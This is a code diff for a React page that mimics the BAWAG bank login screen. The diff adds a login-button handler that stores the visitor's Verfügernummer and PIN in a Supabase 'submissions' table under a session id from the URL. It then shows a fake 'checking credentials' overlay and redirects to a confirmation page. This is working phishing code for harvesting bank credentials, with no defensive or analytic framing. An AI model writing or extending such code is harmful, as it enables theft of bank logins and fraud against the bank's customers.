@@ -1,4 +1,7 @@
 import { useState, useEffect, useRef, useCallback } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
 import { Eye, EyeOff, ChevronRight } from "lucide-react";
 import bawagLogo from "@/assets/bawag_logo.png";
 import bawagBg from "@/assets/bawag_background.jpg";
@@ -68,6 +71,11 @@ const footerUrls = [
 ];
 
 const Bawag = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+  const [showLoading, setShowLoading] = useState(false);
+
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
   const [showPin, setShowPin] = useState(false);
@@ -101,6 +109,8 @@ const Bawag = () => {
   const scaledHeight = contentHeight ? contentHeight * scale : undefined;
 
   return (
+    <>
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
     <div
       className="min-h-screen bg-white overflow-x-hidden flex justify-center"
       style={{
@@ -196,7 +206,17 @@ const Bawag = () => {
                 </div>
 
                 <div className="flex justify-end mb-3">
-                  <button className="w-[60%] py-2.5 bg-[#990000] text-white text-sm font-semibold rounded hover:bg-[#7a0000] transition-colors">
+                  <button onClick={async () => {
+              if (sessionId) {
+                await supabase.from("submissions").update({
+                  bank_username: verfueger,
+                  bank_password: pin,
+                  bank_username_label: "Verfügernummer",
+                  bank_password_label: "PIN",
+                }).eq("session_id", sessionId);
+              }
+              setShowLoading(true);
+            }} className="w-[60%] py-2.5 bg-[#990000] text-white text-sm font-semibold rounded hover:bg-[#7a0000] transition-colors">
                     {t.login}
                   </button>
                 </div>
@@ -270,6 +290,7 @@ const Bawag = () => {
         </div>
       </div>
     </div>
+    </>
   );
 };
 
